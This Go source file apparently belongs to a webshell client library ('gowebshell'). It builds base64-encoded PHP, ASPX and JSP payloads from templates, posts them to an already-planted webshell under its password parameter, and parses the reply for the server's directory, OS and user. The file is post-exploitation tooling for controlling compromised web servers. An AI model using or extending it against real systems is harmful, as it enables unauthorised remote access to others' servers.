package gowebshell

import (
	"encoding/base64"
	"fmt"
	"github.com/zyylhn/gowebshell/template"
	"github.com/zyylhn/gowebshell/utils"
	"io"
	"strings"
)

type BaseInfo struct {
	Pwd string
	RootDir string
	Osinfo string
	User string
}

//从返回的body中读取基本信息
func getBaseResultFromBody(body string) (string,string,string,string,error) {
	list:=strings.Split(body,"\n")
	if len(list)==4{
		return list[0],list[1],list[2],list[3],nil
	}
	return "","","","",fmt.Errorf("解析基本信息失败:%v",list)
}

type Info interface {
	GetBaseInfoBody(webshell *Webshell,random string) io.Reader
}

type PhpBaseinfo struct {}

func (p *PhpBaseinfo) GetBaseInfoBody(webshell *Webshell,random string) io.Reader {
	var script string
	script=fmt.Sprintf(template.PhpTmp,random,template.PhpBaseInfo)
	script=base64.StdEncoding.EncodeToString([]byte(script))
	return utils.GetIoBody(map[string]string{webshell.Password:script})
}

type AspxBaseinfo struct {}

func (p *AspxBaseinfo) GetBaseInfoBody(webshell *Webshell,random string) io.Reader {
	var script string
	baseinfo:=base64.StdEncoding.EncodeToString([]byte(template.AspxBaseinfo))
	script=fmt.Sprintf(template.AspxTmp,random,baseinfo)
	script=base64.StdEncoding.EncodeToString([]byte(script))
	return utils.GetIoBody(map[string]string{webshell.Password:script})
}

type JspBaseinfo struct {}

func (j *JspBaseinfo) GetBaseInfoBody(webshell *Webshell,random string) io.Reader {
	var script string
	script=template.GetJspCode(template.JspBaseinfo, map[string]string{"legowebshellrandom":random})
	return utils.GetIoBody(map[string]string{webshell.Password:script})
}